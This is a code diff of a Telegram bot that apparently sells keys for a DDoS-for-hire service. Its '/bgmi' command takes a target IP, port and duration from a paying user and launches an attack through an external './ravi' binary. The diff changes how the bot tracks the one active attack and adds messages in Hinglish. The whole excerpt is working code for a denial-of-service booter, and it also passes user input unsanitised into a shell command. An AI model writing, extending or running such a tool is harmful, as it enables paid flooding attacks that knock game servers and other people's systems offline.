@@ -402,11 +402,12 @@ def redeem_key(message):
 ## ✅ /RS Attack Command (Auto-Remove from /stats)
 @bot.message_handler(commands=['bgmi'])
 def handle_attack(message):
-    global active_attack  # for global access
+    global active_attack, last_active_attack
+
     user_id = str(message.from_user.id)
     chat_id = str(message.chat.id)
 
-    if not is_user_allowed(user_id):  # ✅ Expired Key Check
+    if not is_user_allowed(user_id):
         bot.reply_to(message, "⏳ **PEHLE KEY BUY KRO**")
         return
 
@@ -436,17 +437,20 @@ def handle_attack(message):
         bot.reply_to(message, f"🚫 MAX ATTACK TIME IS {MAX_DURATION} SECONDS!")
         return
 
-    # ✅ Check if any global attack is already active
+    # ✅ GLOBAL ATTACK CHECK
     if active_attack is not None:
-        bot.reply_to(message, "⚠ BOT PAR EK ATTACK PEHLE SE CHAL RAHA HAI! WAIT KARO.")
+        bot.reply_to(message, "⚠ EK AUR ATTACK CHAL RAHA HAI! PEHLE WOH FINISH HONE DO.")
         return
 
+    # ✅ START ATTACK
     end_time = datetime.datetime.now(IST) + datetime.timedelta(seconds=time_duration)
     active_attack = (user_id, target, port, end_time)
 
     bot.reply_to(message, f"🔥 ATTACK STARTED!\n🎯 TARGET: {target}\n🔢 PORT: {port}\n⏳ DURATION: {time_duration}s")
 
     def attack_execution():
+        global active_attack, last_active_attack
+
         try:
             subprocess.run(f"./ravi {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
         except subprocess.TimeoutExpired:
@@ -454,8 +458,7 @@ def handle_attack(message):
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ ATTACK FAILED!")
 
-        # ✅ Clear active attack after finish
-        global active_attack
+        last_active_attack = active_attack
         active_attack = None
 
     threading.Thread(target=attack_execution).start()
